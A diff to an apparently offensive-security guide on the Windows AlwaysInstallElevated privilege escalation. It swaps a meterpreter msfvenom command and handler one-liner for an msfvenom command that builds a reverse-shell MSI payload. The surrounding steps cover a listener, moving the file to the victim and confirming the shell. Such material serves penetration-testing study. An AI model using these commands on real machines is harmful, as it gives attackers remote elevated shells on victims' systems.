@@ -193,21 +193,13 @@ msiexec /q /n /uninstall NCVInstaller.msi
 
 ### Tool Exploitation
 
-1) To perform exploitation with [msfvenom](https://github.com/rapid7/metasploit-framework), you can use the following command to create a malicious MSI file:
+1) To perform exploitation with msfvenom, you can use the following command to create a malicious MSI file:
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=1234 EXITFUNC=thread -f msi > nickvourd.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f msi > nickvourd.msi
 ```
 
-Outcome:
-
-![Msfvenom-Create-MSI](/Pictures/Msfvenom-Create-MSI.png)
-
-2) Configure Metasploit's handler according to your selected MSI payload preferences:
-
-```
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 1234; set EXITFUNC thread; set ExitOnSession false; exploit -j -z"
-```
+2) Open a listener on your Kali machine.
 
 3) Transfer the malicious MSI file to the victim's machine.
 
@@ -221,9 +213,9 @@ Outcome:
 
 ![AlwaysInstallElevated-New-Session](/Pictures/AlwaysInstallElevated-New-Session.png)
 
-5) Confirm that the new session is with elevated privileges:
+5) Verify the reverse shell on your Kali machine:
 
-![AlwaysInstallElevated-Elevated-Privileges](/Pictures/AlwaysInstallElevated-Elevated-Privileges.png)
+![AlwaysInstallElevated-Elevated-Privileges](/Pictures/AllwaysInstall-Priv-Esc.png)
 
 :information_source: In order to remove MSI file from the victim, run the following command (in a unprivilege session):
 
